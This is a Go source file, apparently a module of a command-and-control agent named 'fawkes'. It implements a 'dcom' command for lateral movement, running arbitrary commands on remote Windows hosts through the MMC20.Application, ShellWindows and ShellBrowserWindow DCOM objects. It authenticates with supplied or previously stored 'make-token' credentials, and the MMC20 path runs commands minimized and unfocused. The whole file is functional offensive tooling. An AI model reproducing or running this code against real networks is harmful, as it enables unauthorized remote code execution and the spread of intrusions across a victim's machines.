//go:build windows
// +build windows

package commands

import (
	"encoding/json"
	"fmt"
	"runtime"
	"strings"
	"unsafe"

	ole "github.com/go-ole/go-ole"
	"github.com/go-ole/go-ole/oleutil"
	"golang.org/x/sys/windows"

	"fawkes/pkg/structs"
)

type DcomCommand struct{}

func (c *DcomCommand) Name() string {
	return "dcom"
}

func (c *DcomCommand) Description() string {
	return "Execute commands on remote hosts via DCOM lateral movement"
}

type dcomArgs struct {
	Action   string `json:"action"`
	Host     string `json:"host"`
	Object   string `json:"object"`
	Command  string `json:"command"`
	Args     string `json:"args"`
	Dir      string `json:"dir"`
	Username string `json:"username"`
	Password string `json:"password"`
	Domain   string `json:"domain"`
}

// DCOM COM object CLSIDs
var (
	clsidMMC20          = ole.NewGUID("{49B2791A-B1AE-4C90-9B8E-E860BA07F889}")
	clsidShellWindows   = ole.NewGUID("{9BA05972-F6A8-11CF-A442-00A0C90A8F39}")
	clsidShellBrowserWd = ole.NewGUID("{C08AFD90-F2A1-11D1-8455-00A0C91F3880}")
)

// ole32.dll for CoCreateInstanceEx and CoSetProxyBlanket
var (
	ole32DCOM               = windows.NewLazySystemDLL("ole32.dll")
	procCoCreateInstanceEx  = ole32DCOM.NewProc("CoCreateInstanceEx")
	procCoSetProxyBlanket   = ole32DCOM.NewProc("CoSetProxyBlanket")
)

// RPC authentication constants
const (
	rpcCAuthnWinNT           = 10 // NTLMSSP
	rpcCAuthzNone            = 0
	rpcCAuthnLevelConnect    = 2
	rpcCImpLevelImpersonate  = 3
	eoacNone                 = 0
	secWinNTAuthIdentityUnic = 0x2 // SEC_WINNT_AUTH_IDENTITY_UNICODE
	clsctxRemoteServer       = 0x10
)

// secWinNTAuthIdentityW matches SEC_WINNT_AUTH_IDENTITY_W for NTLM auth
type secWinNTAuthIdentityW struct {
	User           *uint16
	UserLength     uint32
	Domain         *uint16
	DomainLength   uint32
	Password       *uint16
	PasswordLength uint32
	Flags          uint32
}

// coAuthInfo matches COAUTHINFO for COM remote authentication
type coAuthInfo struct {
	dwAuthnSvc           uint32
	dwAuthzSvc           uint32
	pwszServerPrincName  *uint16
	dwAuthnLevel         uint32
	dwImpersonationLevel uint32
	pAuthIdentityData    uintptr
	dwCapabilities       uint32
}

// COSERVERINFO structure for remote COM activation
type coServerInfo struct {
	dwReserved1 uint32
	pwszName    *uint16
	pAuthInfo   uintptr
	dwReserved2 uint32
}

// MULTI_QI structure for interface results
type multiQI struct {
	pIID *ole.GUID
	pItf uintptr
	hr   int32
}

func (c *DcomCommand) Execute(task structs.Task) structs.CommandResult {
	var args dcomArgs

	if task.Params == "" {
		return structs.CommandResult{
			Output:    "Error: parameters required.\nActions: exec\nObjects: mmc20, shellwindows, shellbrowser",
			Status:    "error",
			Completed: true,
		}
	}

	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	switch strings.ToLower(args.Action) {
	case "exec":
		return dcomExec(args)
	default:
		return structs.CommandResult{
			Output:    fmt.Sprintf("Unknown action: %s\nAvailable: exec", args.Action),
			Status:    "error",
			Completed: true,
		}
	}
}

// dcomAuthState holds authentication state for a DCOM session.
// Used to call CoSetProxyBlanket on each obtained proxy interface.
type dcomAuthState struct {
	identity *secWinNTAuthIdentityW
}

// setProxyBlanket calls CoSetProxyBlanket on an IDispatch to authenticate
// subsequent method calls on the remote COM proxy.
func (a *dcomAuthState) setProxyBlanket(disp *ole.IDispatch) error {
	if a == nil || a.identity == nil {
		return nil
	}
	ret, _, _ := procCoSetProxyBlanket.Call(
		uintptr(unsafe.Pointer(disp)),
		rpcCAuthnWinNT,          // dwAuthnSvc
		rpcCAuthzNone,           // dwAuthzSvc
		0,                       // pServerPrincName (COLE_DEFAULT_PRINCIPAL)
		rpcCAuthnLevelConnect,   // dwAuthnLevel
		rpcCImpLevelImpersonate, // dwImpersonationLevel
		uintptr(unsafe.Pointer(a.identity)), // pAuthInfo
		eoacNone,                // dwCapabilities
	)
	if ret != 0 {
		return fmt.Errorf("CoSetProxyBlanket failed: HRESULT 0x%08X", ret)
	}
	return nil
}

// buildAuthState creates a dcomAuthState from credentials.
func buildAuthState(domain, username, password string) *dcomAuthState {
	if username == "" || password == "" {
		return nil
	}
	userUTF16, _ := windows.UTF16PtrFromString(username)
	domainUTF16, _ := windows.UTF16PtrFromString(domain)
	passwordUTF16, _ := windows.UTF16PtrFromString(password)

	return &dcomAuthState{
		identity: &secWinNTAuthIdentityW{
			User:           userUTF16,
			UserLength:     uint32(len(username)),
			Domain:         domainUTF16,
			DomainLength:   uint32(len(domain)),
			Password:       passwordUTF16,
			PasswordLength: uint32(len(password)),
			Flags:          secWinNTAuthIdentityUnic,
		},
	}
}

// resolveCredentials determines which credentials to use for DCOM auth.
// Priority: explicit params > stored make-token credentials
func resolveCredentials(args dcomArgs) (domain, username, password string, hasExplicit bool) {
	// Check explicit params first
	if args.Username != "" && args.Password != "" {
		domain = args.Domain
		if domain == "" {
			domain = "."
		}
		return domain, args.Username, args.Password, true
	}

	// Fall back to stored credentials from make-token
	creds := GetIdentityCredentials()
	if creds != nil {
		return creds.Domain, creds.Username, creds.Password, true
	}

	return "", "", "", false
}

func dcomExec(args dcomArgs) structs.CommandResult {
	if args.Host == "" {
		return structs.CommandResult{
			Output:    "Error: host is required",
			Status:    "error",
			Completed: true,
		}
	}
	if args.Command == "" {
		return structs.CommandResult{
			Output:    "Error: command is required",
			Status:    "error",
			Completed: true,
		}
	}

	object := strings.ToLower(args.Object)
	if object == "" {
		object = "mmc20"
	}

	switch object {
	case "mmc20":
		return dcomExecMMC20(args)
	case "shellwindows":
		return dcomExecShellWindows(args)
	case "shellbrowser":
		return dcomExecShellBrowser(args)
	default:
		return structs.CommandResult{
			Output:    fmt.Sprintf("Unknown DCOM object: %s\nAvailable: mmc20, shellwindows, shellbrowser", args.Object),
			Status:    "error",
			Completed: true,
		}
	}
}

// createRemoteCOM creates a COM object on a remote host via CoCreateInstanceEx.
// If credentials are provided, they are passed via COAUTHINFO in COSERVERINFO.
// Returns the IDispatch and an auth state for setting proxy blankets on sub-interfaces.
func createRemoteCOM(host string, clsid *ole.GUID, domain, username, password string) (*ole.IDispatch, *dcomAuthState, error) {
	hostUTF16, err := windows.UTF16PtrFromString(host)
	if err != nil {
		return nil, nil, fmt.Errorf("invalid host: %v", err)
	}

	serverInfo := &coServerInfo{
		pwszName: hostUTF16,
	}

	// Build auth state for CoSetProxyBlanket on sub-interfaces
	authState := buildAuthState(domain, username, password)

	// If credentials are provided, build COAUTHINFO with SEC_WINNT_AUTH_IDENTITY
	if authState != nil {
		authInfo := &coAuthInfo{
			dwAuthnSvc:           rpcCAuthnWinNT,
			dwAuthzSvc:           rpcCAuthzNone,
			pwszServerPrincName:  nil,
			dwAuthnLevel:         rpcCAuthnLevelConnect,
			dwImpersonationLevel: rpcCImpLevelImpersonate,
			pAuthIdentityData:    uintptr(unsafe.Pointer(authState.identity)),
			dwCapabilities:       eoacNone,
		}

		serverInfo.pAuthInfo = uintptr(unsafe.Pointer(authInfo))
	}

	qi := multiQI{
		pIID: ole.IID_IDispatch,
	}

	ret, _, _ := procCoCreateInstanceEx.Call(
		uintptr(unsafe.Pointer(clsid)),
		0, // punkOuter
		clsctxRemoteServer,
		uintptr(unsafe.Pointer(serverInfo)),
		1, // dwCount
		uintptr(unsafe.Pointer(&qi)),
	)

	if ret != 0 {
		return nil, nil, fmt.Errorf("CoCreateInstanceEx failed: HRESULT 0x%08X", ret)
	}
	if qi.hr != 0 {
		return nil, nil, fmt.Errorf("interface query failed: HRESULT 0x%08X", qi.hr)
	}
	if qi.pItf == 0 {
		return nil, nil, fmt.Errorf("CoCreateInstanceEx returned nil interface")
	}

	// Convert raw interface pointer to IDispatch
	disp := (*ole.IDispatch)(unsafe.Pointer(qi.pItf))

	// Set proxy blanket on the initial interface
	if authState != nil {
		if err := authState.setProxyBlanket(disp); err != nil {
			disp.Release()
			return nil, nil, fmt.Errorf("failed to set proxy blanket: %v", err)
		}
	}

	return disp, authState, nil
}

// dcomExecMMC20 executes a command via MMC20.Application DCOM object.
// Path: Document.ActiveView.ExecuteShellCommand(command, dir, args, "7")
func dcomExecMMC20(args dcomArgs) structs.CommandResult {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	err := ole.CoInitializeEx(0, ole.COINIT_MULTITHREADED)
	if err != nil {
		oleErr, ok := err.(*ole.OleError)
		if !ok || (oleErr.Code() != ole.S_OK && oleErr.Code() != 0x00000001) {
			return structs.CommandResult{
				Output:    fmt.Sprintf("CoInitializeEx failed: %v", err),
				Status:    "error",
				Completed: true,
			}
		}
	}
	defer ole.CoUninitialize()

	domain, username, password, hasCreds := resolveCredentials(args)
	credInfo := ""
	if hasCreds {
		credInfo = fmt.Sprintf("\n  Auth: %s\\%s (explicit)", domain, username)
	}

	mmc, authState, err := createRemoteCOM(args.Host, clsidMMC20, domain, username, password)
	if err != nil {
		hint := ""
		if !hasCreds {
			hint = "\n  Hint: Use make-token first or provide -username/-password/-domain params"
		}
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to create MMC20.Application on %s: %v%s", args.Host, err, hint),
			Status:    "error",
			Completed: true,
		}
	}
	defer mmc.Release()

	// Get Document property
	docResult, err := oleutil.GetProperty(mmc, "Document")
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to get Document: %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	defer docResult.Clear()
	doc := docResult.ToIDispatch()
	if authState != nil {
		_ = authState.setProxyBlanket(doc)
	}

	// Get ActiveView property
	viewResult, err := oleutil.GetProperty(doc, "ActiveView")
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to get ActiveView: %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	defer viewResult.Clear()
	view := viewResult.ToIDispatch()
	if authState != nil {
		_ = authState.setProxyBlanket(view)
	}

	// ExecuteShellCommand(Command, Directory, Parameters, WindowState)
	// WindowState "7" = SW_SHOWMINNOACTIVE (minimized, no focus)
	dir := args.Dir
	if dir == "" {
		dir = "C:\\Windows\\System32"
	}
	_, err = oleutil.CallMethod(view, "ExecuteShellCommand", args.Command, dir, args.Args, "7")
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("ExecuteShellCommand failed: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    fmt.Sprintf("DCOM MMC20.Application executed on %s:\n  Command: %s\n  Args: %s\n  Directory: %s\n  Method: Document.ActiveView.ExecuteShellCommand%s", args.Host, args.Command, args.Args, dir, credInfo),
		Status:    "success",
		Completed: true,
	}
}

// dcomExecShellWindows executes a command via ShellWindows DCOM object.
// Path: Item().Document.Application.ShellExecute(command, args, dir, "open", 0)
func dcomExecShellWindows(args dcomArgs) structs.CommandResult {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	err := ole.CoInitializeEx(0, ole.COINIT_MULTITHREADED)
	if err != nil {
		oleErr, ok := err.(*ole.OleError)
		if !ok || (oleErr.Code() != ole.S_OK && oleErr.Code() != 0x00000001) {
			return structs.CommandResult{
				Output:    fmt.Sprintf("CoInitializeEx failed: %v", err),
				Status:    "error",
				Completed: true,
			}
		}
	}
	defer ole.CoUninitialize()

	domain, username, password, hasCreds := resolveCredentials(args)
	credInfo := ""
	if hasCreds {
		credInfo = fmt.Sprintf("\n  Auth: %s\\%s (explicit)", domain, username)
	}

	shellWin, authState, err := createRemoteCOM(args.Host, clsidShellWindows, domain, username, password)
	if err != nil {
		hint := ""
		if !hasCreds {
			hint = "\n  Hint: Use make-token first or provide -username/-password/-domain params"
		}
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to create ShellWindows on %s: %v%s", args.Host, err, hint),
			Status:    "error",
			Completed: true,
		}
	}
	defer shellWin.Release()

	// Get Item(0) — returns an Internet Explorer / Explorer window
	itemResult, err := oleutil.CallMethod(shellWin, "Item")
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to get Item: %v (requires an explorer.exe shell on target)", err),
			Status:    "error",
			Completed: true,
		}
	}
	defer itemResult.Clear()
	item := itemResult.ToIDispatch()
	if authState != nil {
		_ = authState.setProxyBlanket(item)
	}

	// Get Document
	docResult, err := oleutil.GetProperty(item, "Document")
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to get Document: %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	defer docResult.Clear()
	docDisp := docResult.ToIDispatch()
	if authState != nil {
		_ = authState.setProxyBlanket(docDisp)
	}

	// Get Application (returns Shell.Application)
	appResult, err := oleutil.GetProperty(docDisp, "Application")
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to get Application: %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	defer appResult.Clear()
	app := appResult.ToIDispatch()
	if authState != nil {
		_ = authState.setProxyBlanket(app)
	}

	// ShellExecute(File, vArgs, vDir, vOperation, vShow)
	dir := args.Dir
	if dir == "" {
		dir = "C:\\Windows\\System32"
	}
	_, err = oleutil.CallMethod(app, "ShellExecute", args.Command, args.Args, dir, "open", 0)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("ShellExecute failed: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    fmt.Sprintf("DCOM ShellWindows executed on %s:\n  Command: %s\n  Args: %s\n  Directory: %s\n  Method: Item().Document.Application.ShellExecute%s", args.Host, args.Command, args.Args, dir, credInfo),
		Status:    "success",
		Completed: true,
	}
}

// dcomExecShellBrowser executes a command via ShellBrowserWindow DCOM object.
// Path: Document.Application.ShellExecute(command, args, dir, "open", 0)
func dcomExecShellBrowser(args dcomArgs) structs.CommandResult {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	err := ole.CoInitializeEx(0, ole.COINIT_MULTITHREADED)
	if err != nil {
		oleErr, ok := err.(*ole.OleError)
		if !ok || (oleErr.Code() != ole.S_OK && oleErr.Code() != 0x00000001) {
			return structs.CommandResult{
				Output:    fmt.Sprintf("CoInitializeEx failed: %v", err),
				Status:    "error",
				Completed: true,
			}
		}
	}
	defer ole.CoUninitialize()

	domain, username, password, hasCreds := resolveCredentials(args)
	credInfo := ""
	if hasCreds {
		credInfo = fmt.Sprintf("\n  Auth: %s\\%s (explicit)", domain, username)
	}

	browser, authState, err := createRemoteCOM(args.Host, clsidShellBrowserWd, domain, username, password)
	if err != nil {
		hint := ""
		if !hasCreds {
			hint = "\n  Hint: Use make-token first or provide -username/-password/-domain params"
		}
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to create ShellBrowserWindow on %s: %v%s", args.Host, err, hint),
			Status:    "error",
			Completed: true,
		}
	}
	defer browser.Release()

	// Get Document
	docResult, err := oleutil.GetProperty(browser, "Document")
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to get Document: %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	defer docResult.Clear()
	docDisp := docResult.ToIDispatch()
	if authState != nil {
		_ = authState.setProxyBlanket(docDisp)
	}

	// Get Application (returns Shell.Application)
	appResult, err := oleutil.GetProperty(docDisp, "Application")
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to get Application: %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	defer appResult.Clear()
	app := appResult.ToIDispatch()
	if authState != nil {
		_ = authState.setProxyBlanket(app)
	}

	// ShellExecute(File, vArgs, vDir, vOperation, vShow)
	dir := args.Dir
	if dir == "" {
		dir = "C:\\Windows\\System32"
	}
	_, err = oleutil.CallMethod(app, "ShellExecute", args.Command, args.Args, dir, "open", 0)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("ShellExecute failed: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    fmt.Sprintf("DCOM ShellBrowserWindow executed on %s:\n  Command: %s\n  Args: %s\n  Directory: %s\n  Method: Document.Application.ShellExecute%s", args.Host, args.Command, args.Args, dir, credInfo),
		Status:    "success",
		Completed: true,
	}
}
